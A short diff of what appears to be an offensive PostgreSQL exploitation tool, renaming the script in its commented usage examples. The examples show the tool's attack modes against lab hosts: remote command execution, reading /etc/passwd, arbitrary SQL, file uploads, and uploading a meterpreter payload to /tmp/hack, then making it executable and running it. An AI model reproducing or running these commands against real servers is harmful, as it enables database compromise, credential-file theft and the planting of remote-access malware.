@@ -202,10 +202,10 @@ elif attack_mode == "sql" and command:
     sql_query(connect(timeoutsec), command, output=True)
 
 # sql_query(connect(host=host, password=password), "show server_version;")
-# python main.py --host "192.168.163.156" -w "123456" -m "rce" -c "whoami" -e "GBK"
-# python main.py --host "192.168.163.149" -w "123456" -m "read" -s "/etc/passwd" -e "UTF8"
-# python main.py --host "192.168.163.149" -w "123456" -m "sql" -c "show server_version;" -e "UTF8"
-# python main.py --host "192.168.163.149" -w "123456" -m "text_upload" -s "this is test" -t "/tmp/1.txt"
-# python main.py --host "192.168.163.149" -w "123456" -m "bin_upload" -s "C:\Users\HP\Downloads\FOV 100-99-0-1-1693540851.zip" -t "/tmp/1.zip"
-# python main.py --host "192.168.163.149" -w "123456" -m "bin_upload" -s "C:\Users\HP\Desktop\白名单\meterpreter" -t "/tmp/hack"
-# python main.py --host "192.168.163.149" -w "123456" -m "rce" -c "chmod +x /tmp/hack;/tmp/hack" -e "UTF8"
+# python PostgreSQL_tool.py --host "192.168.163.156" -w "123456" -m "rce" -c "whoami" -e "GBK"
+# python PostgreSQL_tool.py --host "192.168.163.149" -w "123456" -m "read" -s "/etc/passwd" -e "UTF8"
+# python PostgreSQL_tool.py --host "192.168.163.149" -w "123456" -m "sql" -c "show server_version;" -e "UTF8"
+# python PostgreSQL_tool.py --host "192.168.163.149" -w "123456" -m "text_upload" -s "this is test" -t "/tmp/1.txt"
+# python PostgreSQL_tool.py --host "192.168.163.149" -w "123456" -m "bin_upload" -s "C:\Users\HP\Downloads\FOV 100-99-0-1-1693540851.zip" -t "/tmp/1.zip"
+# python PostgreSQL_tool.py --host "192.168.163.149" -w "123456" -m "bin_upload" -s "C:\Users\HP\Desktop\白名单\meterpreter" -t "/tmp/hack"
+# python PostgreSQL_tool.py --host "192.168.163.149" -w "123456" -m "rce" -c "chmod +x /tmp/hack;/tmp/hack" -e "UTF8"
